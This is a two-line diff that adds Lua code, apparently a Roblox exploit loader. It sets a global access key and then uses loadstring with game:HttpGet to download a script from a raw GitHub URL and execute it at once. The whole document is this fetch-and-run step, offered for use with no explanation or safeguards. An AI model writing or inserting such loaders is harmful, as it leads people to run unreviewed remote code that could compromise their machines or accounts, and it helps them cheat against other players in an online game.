@@ -1,0 +1,2 @@
+_G.Key = "930retnuh_wodahs"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
